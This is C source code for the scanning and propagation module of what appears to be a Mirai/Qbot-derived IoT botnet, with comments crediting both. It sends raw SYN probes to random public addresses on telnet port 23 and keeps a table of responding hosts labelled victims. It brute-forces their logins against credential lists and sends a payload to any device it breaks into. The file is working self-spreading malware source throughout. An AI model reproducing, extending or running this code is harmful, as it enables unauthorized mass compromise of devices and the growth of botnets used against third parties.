#include "../include/main.h"

static port_t LOCAL_PORT; // Global source port
static ipv4_t LOCAL_ADDR; // Global source port
static struct scan_victim *victim_table;

static bool scan_able = true;
static bool scan_scanning = false;

void scan_init(void) {
#ifndef SCANNER_TEST
	int32_t ret;

	if ((ret = fork()) != 0)
		return; // We are parent or it failed, lets go home

	else {
		// Child has spawned and we are the child
		// if (proc_root()) // Make it check for root and stuff later
		if (scan_scanner() == false)
			scan_able = false;
		_exit(0);
	}
#endif // SCANNER_TEST
	return;
}

// I didn't write the checksum funcs
static uint16_t checksum_generic(uint16_t *addr, uint32_t count) {
	// unsigned long sum = 0;
	uint16_t sum = 0;

	for (sum = 0; count > 1; count -= 2)
		sum += *addr++;
	if (count == 1)
		sum += (char)*addr;

	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	
	return ~sum;
}

static uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len) {
	uint16_t *buf = buff;
	uint32_t ip_src = iph->saddr;
	uint32_t ip_dst = iph->daddr;
	uint32_t sum = 0;
	
	while (len > 1) {
		sum += *buf;
		buf++;
		len -= 2;
	}

	if (len == 1)
		sum += *((uint8_t *)buf);

	sum += (ip_src >> 16) & 0xFFFF;
	sum += ip_src & 0xFFFF;
	sum += (ip_dst >> 16) & 0xFFFF;
	sum += ip_dst & 0xFFFF;
	sum += htons(iph->protocol);
	sum += data_len;

	while (sum >> 16) 
		sum = (sum & 0xFFFF) + (sum >> 16);

	return ((uint16_t) (~sum));
}

/*
Credits to mirai for this one
I tried to make my own that worked but apparantly I'm not to great as it ended up making
the telnet server send the password and login in the same packet which breaks the scanner
*/
static inline __attribute__((always_inline)) void scan_negotiate(int32_t sock) {
	unsigned char ptr[3];

	while(1) {
		recv(sock, ptr, 3, MSG_NOSIGNAL);
		if (*ptr != 0xff)
			break;
		else if (*ptr == 0xff) {	
			if (ptr[1] == 0xff) {
				continue;
			}
			else if (ptr[1] == 0xfd) {
				uint8_t tmp1[3] = {255, 251, 31};
				uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

				if (ptr[2] != 31)
					goto iac_wont;

				send(sock, tmp1, 3, MSG_NOSIGNAL);
				send(sock, tmp2, 9, MSG_NOSIGNAL);
			}
			else {
				iac_wont:
				for (uint8_t i = 0; i < 3; i++) {
					if (ptr[i] == 0xfd)
						ptr[i] = 0xfc;
					else if (ptr[i] == 0xfb)
						ptr[i] = 0xfd;
				}
				send(sock, ptr, 3, MSG_NOSIGNAL);
			}
		}
	}

	return;
}

static void xselect(int32_t fd) {
	fd_set fdset;
	struct timeval timeout;
	timeout.tv_sec = SCAN_SCANNER_STIMEOUT_SEC;
	timeout.tv_usec = SCAN_SCANNER_STIMEOUT_USEC;

	// I might be able to just change fdset to null?
	// Technically I could use FS_ISSET() but the recv() will throw an error anyway so it's fine
	FD_ZERO(&fdset);
	FD_SET(fd, &fdset);
	select(fd + 1, &fdset, NULL, NULL, &timeout);
}

bool structcmp(unsigned char *buf, const char **str) {
	while (*str != NULL) {
		// printf("Comparing \"%s\" -> \"%s\"\n", buf, *str);
		if (subcasestr((const char *)buf, *str++) != -1)
			return true;
	}
	return false;
}

static uint8_t scan_readuntil(const int32_t sock, const char **strs, const char **strs2) {
	uint8_t found = 0;
	int16_t i = 0;
	unsigned char *buf = malloc(sizeof(unsigned char *)); // 1 byte alloc cuz I'm skilled

	unsigned char mbuf[1024];
	zero(mbuf, sizeof(mbuf));

	while (1) {
		xselect(sock); // When I remove this it screws up so I guess we need it
		if (recv(sock, buf, 1, MSG_NOSIGNAL) < 0) { // Read 1 from socket
			if (found == 0)
				printd("Error %d: %s", errno, strerror(errno));
			else
				printd("Read failed found %d", found);
			break;
			
		}

		if (found == 0) {
			/* 	Don't let it overflow
			This is probably not very efficient, I should remove it but I wanna be safe */
			if (i < (int16_t)sizeof(mbuf))
				mbuf[i++] = *buf;
			else {
				// Save the last 100 chars
				unsigned char tmp[100];
				for(uint8_t x = 0; x < 100; x++)
					tmp[x] = mbuf[924 + x];
				zero(mbuf, sizeof(mbuf));
				strncpy((char *)mbuf, (const char *)tmp, 100);
				i = 0; 
			}

			// printf("\"%s\"\n", mbuf);

			if (structcmp(mbuf, strs) == true) {
				printf("Found 1\n");
				found = 1;
			}
			if (structcmp(mbuf, strs2) == true) {
				printf("Found 2\n");
				found = 2;
			}
		}
	}
	free(buf);
	return found;
}

static bool scan_setnonblock(int32_t fd) {
	if (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)) == -1) {
		printd("Failed to set nonblocking error %d: %s", errno, strerror(errno));
		return false;
	}
	return true;
}

bool scan_scanner(void) {
#ifdef DEBUG
	int32_t max = getdtablesize();
	printd("Maximum files open: %d", max);
#endif // DEBUG
#ifndef SCANNER_TEST
	if (scan_able == false || scan_scanning == true)
		_exit(0);
#endif // SCANNER_TEST
	scan_scanning = true;
	printd("Initializing Scanner");

	victim_table = calloc(SCAN_SCANNER_MAXCON, sizeof(struct scan_victim));
	for (uint8_t i = 0; i < SCAN_SCANNER_MAXCON; i++) {
		victim_table[i].sock = -1;
		victim_table[i].state = END;
		victim_table[i].user = 0;
		victim_table[i].pass = 0;
		victim_table[i].tries = 0;
	}

	int32_t sock, i = 1;
	int64_t n;

	char datagram[200];
	zero(datagram, 200);

	// IP and TCP  structures
	struct iphdr *iph = (struct iphdr *)datagram;
	struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

	/* sockaddr struct and checksum struct */
	struct sockaddr_in addr;

#	ifdef SCANNER_TEST
	LOCAL_ADDR = ipv4_pack(127, 0, 0, 1);
#	else
	if (ipv4_getinfo(&LOCAL_ADDR) == false)
		goto end;
#	endif
	printd("Local info: %d %s", LOCAL_ADDR, ipv4_unpack(LOCAL_ADDR));

	do // Set the random source port
		LOCAL_PORT = (port_t)rand();
	while (LOCAL_PORT < 1024); // make sure it isn't send below 1024 which is reserved for root use only


	// Sockaddr header fillout
	addr.sin_family = AF_INET;
	addr.sin_port = htons(23);

	// IP header fillout
	iph->saddr = LOCAL_ADDR;
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0; // TOS = Type of service Can change QoS
	iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
	iph->ttl = 64; // TTL = TTL goes down onces for ever re-router it hits. If it hits 0 its discarded and icmp error sent
	iph->protocol = 6; // 6 = TCP

	// TCP header fillout
	tcph->source = htons(LOCAL_PORT);
	tcph->dest = htons(23); // Port 23 dest
	tcph->ack_seq = 0;
	tcph->doff = 5; // Size of tcp header
	tcph->fin = 0;
	tcph->syn = 1; // Syncronize packet to check if the port is open
	tcph->rst = 0; // No other should be checked
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->window = rand() & 0xffff; // Maximum allowed window size
	tcph->urg_ptr = 0;

	// Create a raw socket
	if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
		printd("Failed to open raw socket");
		goto end;
	}


	if ((fcntl(sock, F_SETFL, O_NONBLOCK | fcntl(sock, F_GETFL, 0))) == -1) {
		printd("fcntl() failed to set O_NONBLOCK. Errno: %d | %s", errno, strerror(errno));
		goto end;
	}

	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) < 0) {
		printd("Failed to set IP_HDRINCL");
		goto end;
	}

	while (1) {
#		ifndef SCANNER_TEST
		for (i = 0; i < SCAN_SCANNER_BURST; i++)
#		endif
		{
#			ifdef SCANNER_TEST
			iph->daddr = ipv4_pack(127, 0, 0, 1);
#			else
			iph->daddr = ipv4_random_public();
#			endif
			iph->id = (rand() % 65535); // This line might be wrong
			iph->check = 0;
			iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

			tcph->seq = iph->daddr;
			tcph->check = 0;
			tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

			// Fill out addr
			addr.sin_addr.s_addr = iph->daddr;

			// Send the packet
			sendto(sock, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&addr, sizeof(addr));
#			ifdef SCANNER_TEST
			sleep(1); // Don't spam packets if we're testing
#			endif
		}
		while (1) {
			char buf[1514];
			struct iphdr *riph = (struct iphdr *)buf;
			struct tcphdr *rtcph = (struct tcphdr *)(riph + 1);

			n = recvfrom(sock, buf, sizeof(buf), MSG_NOSIGNAL, NULL, NULL);
			if (n <= 0 /*|| errno == EAGAIN || errno == EWOULDBLOCK || errno != 0*/)
				break;

			// printd("%s->%s/%s\t Proto: %d Flags: SYN %d ACK %d RST %d", ipv4_unpack(riph->saddr), ipv4_unpack(riph->daddr), ipv4_unpack(LOCAL_ADDR), riph->protocol, rtcph->syn, rtcph->ack, rtcph->rst);
			if (n < (int32_t)(sizeof(struct iphdr) + sizeof(struct tcphdr)))
				continue;
			if (riph->protocol != 6) // Packet needs to be TCP
				continue;
			if (rtcph->syn != 1)
				continue;
			if (rtcph->ack != 1)
				continue;
			if (rtcph->source != htons(23))
				continue;
			// This line was also iph->daddr instead of riph->daddr which was even more debugging
			if (riph->daddr != LOCAL_ADDR)
				continue;

			// Send back a ack rst to close any running threads on the telnet server
			/*
			iph->saddr = LOCAL_ADDR;
			iph->daddr = riph->saddr;
			iph->ihl = 5;
			iph->version = 4;
			iph->tos = 0; // TOS = Type of service Can change QoS
			iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
			iph->ttl = 64; // TTL = TTL goes down onces for ever re-router it hits. If it hits 0 its discarded and icmp error sent
			iph->protocol = 6; // 6 = TCP
			iph->id = (rand() % 65535); // This line might be wrong
			iph->check = 0;
			iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

			tcph->source = htons(LOCAL_PORT);
			tcph->dest = htons(23); // Port 23 dest
			tcph->ack_seq = 0;
			tcph->doff = 5; // Size of tcp header
			tcph->fin = 0;
			tcph->syn = 0;
			tcph->rst = 1;
			tcph->psh = 0;
			tcph->ack = 1;
			tcph->urg = 0;
			tcph->window = rand() & 0xffff; // Maximum allowed window size
			tcph->urg_ptr = 0;
			tcph->seq = (rand() % 65535);
			tcph->check = 0;
			tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

			addr.sin_addr.s_addr = iph->daddr;

			sendto(sock, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&addr, sizeof(addr)); */

			printd("Attempting to brute: %s", ipv4_unpack(riph->saddr));

			uint8_t x;
			for (x = 0; x < SCAN_SCANNER_MAXCON; x++) {
				if (victim_table[x].state == END) {
					struct scan_victim *victim;
					victim = &victim_table[x];
					victim->ip = riph->saddr;
					victim->user = 0;
					victim->pass = 0;
					victim->tries = 0;
					victim->state = CONNECTING;
					break; // Break from for loop
				}
			}
			if (x == SCAN_SCANNER_MAXCON) // If we filled all available slots lets break
				break;
		}
		// while (1)
		{ // To make all this dealloc automaticly
			struct sockaddr_in addrx;
			addrx.sin_family = AF_INET;
			addrx.sin_port = htons(23);
			memset(addrx.sin_zero, '\0', sizeof(addrx.sin_zero));

			fd_set fdset;
			struct timeval timeout;
			timeout.tv_sec = SCAN_SCANNER_TIMEOUT_SEC;
			timeout.tv_usec = SCAN_SCANNER_TIMEOUT_USEC;
			struct timeval stimeout;
			stimeout.tv_sec = SCAN_SCANNER_STIMEOUT_SEC;
			stimeout.tv_usec = SCAN_SCANNER_STIMEOUT_USEC;

			while (1) {
				for (i = 0; i < SCAN_SCANNER_MAXCON; i++) {
					switch(victim_table[i].state) {
						case CONNECTING: {
							addrx.sin_addr.s_addr = victim_table[i].ip;
							if ((victim_table[i].sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
								victim_table[i].state = FINISHED;
								break;
							}

							// setsockopt(victim_table[i].sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
							// setsockopt(victim_table[i].sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));

							if (scan_setnonblock(victim_table[i].sock) == false) {
								victim_table[i].state = FINISHED;
								break;
							}

							if (connect(victim_table[i].sock, (struct sockaddr *)&addrx, sizeof(addrx)) == -1 && errno != EINPROGRESS) {
								printd("%d->%s Failed to connect error %d: %s", i, ipv4_unpack(victim_table[i].ip), errno, strerror(errno));
							}
							else {
								printd("%d->%s Connected", i, ipv4_unpack(victim_table[i].ip));
							}
							victim_table[i].state = SELECT;
							break;
						}
						case SELECT: {
							FD_ZERO(&fdset);
							FD_SET(victim_table[i].sock, &fdset);
							if (select(victim_table[i].sock + 1, NULL, &fdset, NULL, &stimeout) <= 0) {
								printd("%d->%s Failed to select error %d: %s", i, ipv4_unpack(victim_table[i].ip), errno, strerror(errno));
								victim_table[i].state = FINISHED;
							}
							else {
								printd("%d->%s Select success", i, ipv4_unpack(victim_table[i].ip));
								scan_negotiate(victim_table[i].sock);
								// From Qbot scanner
								// I think it checks for erros and if thers one valopt becomes 1
								socklen_t tmp = sizeof(int);
								int32_t retval = 0;
								getsockopt(victim_table[i].sock, SOL_SOCKET, SO_ERROR, (void*)(&retval), &tmp);
								if (retval)
									victim_table[i].state = FINISHED;
								else
									victim_table[i].state = USERNAME;
							}
							break;
						}
						case USERNAME: {
							uint8_t x = scan_readuntil(victim_table[i].sock, userprompts, prompts);

							switch (x) {
								case 0:
									printd("%d->%s Failed to read", i, ipv4_unpack(victim_table[i].ip));
									victim_table[i].state = FINISHED;
									goto _breakuser;
								case 1:
									printd("%d->%s Found userprompt", i, ipv4_unpack(victim_table[i].ip));
									break;
								case 2:
									printd("%d->%s Got payload prompt", i, ipv4_unpack(victim_table[i].ip));
									victim_table[i].state = PAYLOAD;
									goto _breakuser;
							}
							printd("%d->%s Trying username %s", i, ipv4_unpack(victim_table[i].ip), usernames[victim_table[i].user]);
							if (send(victim_table[i].sock, usernames[victim_table[i].user], strlen(usernames[victim_table[i].user]), 0) == -1) {
								printd("%d->%s Failed to send username", i, ipv4_unpack(victim_table[i].ip));
								victim_table[i].state = FINISHED;
								break;
							}
							x = scan_readuntil(victim_table[i].sock, failstrs, passprompts);
							switch (x) {
								case 0:
									printd("%d->%s Failed to read", i, ipv4_unpack(victim_table[i].ip));
									victim_table[i].state = FINISHED;
									break;
								case 1:
									printd("%d->%s Username failed", i, ipv4_unpack(victim_table[i].ip));
									if (victim_table[i].user++ >= usersize)
										victim_table[i].state = FINISHED;
									break;
								case 2:
									printd("%d->%s Found password prompt", i, ipv4_unpack(victim_table[i].ip));
									victim_table[i].state = PASSWORD;
									break;
							}
_breakuser:
							break;
						}
						case PASSWORD: {
							printd("%d->%s Trying password %s", i, ipv4_unpack(victim_table[i].ip), passwords[victim_table[i].user]);
							if (send(victim_table[i].sock, passwords[victim_table[i].pass], strlen(passwords[victim_table[i].pass]), 0) == -1) {
								printd("%d->%s Failed to send password", i, ipv4_unpack(victim_table[i].ip));
								victim_table[i].state = FINISHED;
								break;
							}

							uint8_t x = scan_readuntil(victim_table[i].sock, failstrs, prompts);
							switch (x) {
								case 0:
									printd("%d->%s Failed to read", i, ipv4_unpack(victim_table[i].ip));
									victim_table[i].state = FINISHED;
									break;
								case 1:
									printd("%d->%s Password failed", i, ipv4_unpack(victim_table[i].ip));
									if (victim_table[i].pass++ >= passsize) {
										victim_table[i].pass = 0;
										if (victim_table[i].user++ >= usersize)
											victim_table[i].state = FINISHED;
										else
											victim_table[i].state = USERNAME;
									}
								case 2:
									printd("%d->%s Password success", i, ipv4_unpack(victim_table[i].ip));
									victim_table[i].state = PAYLOAD;
							}
							break;
						}
						case PAYLOAD: {
							// I know this look stupid for now but I'll clean it up later
							/* Why does the payload never send??*/
							printd("%d->%s Sending payload", i, ipv4_unpack(victim_table[i].ip));
							if (send(victim_table[i].sock, SCAN_SCANNER_PAYLOAD, SCAN_SCANNER_PAYLOAD_LEN, 0) == -1) {
								printd("Failed to send payload");
								victim_table[i].state = FINISHED;
							}
							else
								printd("Payload sent: %s", SCAN_SCANNER_PAYLOAD);
							victim_table[i].state = FINISHED;
							break;
						}
						case FINISHED: {
							printd("%d->%s Finished", i, ipv4_unpack(victim_table[i].ip));
							close(victim_table[i].sock);
							victim_table[i].state = END;
							goto _breakbrute; // If one of our cons is free lets go find a new thing to bruteforce
						}
						case END: {
							break;

						}
					}
				}
			}
		}
		// Break from bruteforce
		_breakbrute:;
	}
end:
	scan_scanning = false;
	free(victim_table);
	_exit(0);
}
